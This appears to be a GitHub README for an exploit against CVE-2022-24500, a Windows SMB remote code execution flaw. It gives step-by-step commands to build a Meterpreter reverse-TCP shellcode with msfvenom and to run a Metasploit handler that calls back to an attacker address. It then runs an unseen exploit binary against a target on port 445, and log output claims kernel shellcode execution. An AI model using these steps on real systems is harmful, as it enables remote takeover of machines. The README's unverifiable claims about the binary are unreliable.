# CVE-2022-24500 RCE Exploit

### Windows SMB Remote Code Execution Vulnerability
Vulnerability: Windows 7 - Windows 2022
https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-24500

### step 1

```Bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.10.22.105 LPORT=4444 -f raw > shellcode.bin
```

### step 2
```Bash
msf5 > use multi/handler
msf5 exploit(multi/handler) > set LHOST 192.10.22.105
LHOST => 192.10.22.105
msf5 exploit(multi/handler) > set LPORT 4444
LPORT => 4444
msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > run
```

### Exploit

CVE-2022-24500 ip port

```Bash
C:\>CVE-2022-24500.exe 192.10.22.107 445
CVE-2022-24500 SMB Remote Exploit
[+] Checking... 192.10.22.107 445
[+] 192.10.22.107 445 IsOpen
[+] found low stub at phys addr 13000!
[+] PML4 at 1ad000
[+] base of HAL heap at fffff79480000000
[+] ntoskrnl entry at fffff80645792010
[+] found PML4 self-ref entry 1eb
[+] found HalpInterruptController at fffff79480001478
[+] found HalpApicRequestInterrupt at fffff80645cb3bb0
[+] load shellcode.bin
[+] built shellcode!
[+] KUSER_SHARED_DATA PTE at fffff5fbc0000000
[+] KUSER_SHARED_DATA PTE NX bit cleared!
[+] Wrote shellcode at fffff78000000a00!
[+] Try to execute shellcode!
[+] Exploit Suceess!
```

![image](https://github.com/rkxxz/CVE-2022-24500/blob/main/CVE-2022-24500.gif)

